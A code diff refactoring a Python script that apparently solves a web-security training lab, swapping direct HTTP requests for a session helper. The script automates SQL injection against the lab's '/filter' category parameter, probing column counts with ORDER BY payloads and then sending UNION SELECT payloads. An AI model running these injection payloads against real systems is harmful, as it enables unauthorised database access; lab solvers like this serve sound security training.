@@ -1,28 +1,25 @@
 from ...utils import *
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin
-
-import requests
 import re
 
 
-def solve_lab(url, proxies):
+def solve_lab(session):
     print_info("Extracting string value provided by lab...")
-    resp = requests.get(url, proxies=proxies, verify=False)
+    resp = session.get_path("/")
     soup = BeautifulSoup(resp.text, "html.parser")
     hint = soup.select_one("#hint").text
 
     value = re.match(r"Make the database retrieve the string: '([^']+)'", hint).group(1)
     print_success(f"Provided string value: {value}\n")
 
-    url = urljoin(url, "/filter")
+    path = "/filter"
     print_info("Determining the number of columns...")
 
     num_columns = 0
     i = 1
     while True:
         params = {"category": f"' ORDER BY {i} --"}
-        resp = requests.get(url, params=params, proxies=proxies, verify=False)
+        resp = session.get_path(path, params=params)
         print_info_secondary(f"{params} => {resp.status_code}")
         if resp.status_code == 500:
             break
@@ -40,7 +37,7 @@ def solve_lab(url, proxies):
         columns = ", ".join(columns)
 
         params = {"category": f"' UNION SELECT {columns} -- //"}
-        resp = requests.get(url, params=params, proxies=proxies, verify=False)
+        resp = session.get_path(path, params=params)
         print_info_secondary(f"{params} => {resp.status_code}")
         if resp.status_code == 200:
             break
@@ -59,9 +56,9 @@ def solve_lab(url, proxies):
     params = {"category": f"' UNION SELECT {columns} --"}
 
     print_info(
-        f'Performing SQL injection UNION attack by visiting "{url}" with the following parameters:'
+        f'Performing SQL injection UNION attack by visiting "{path}" with the following parameters:'
     )
     print(params)
 
-    requests.get(url, params=params, proxies=proxies, verify=False)
+    session.get_path(path, params=params)
     print_success("SQL injection UNION attack performed.\n")
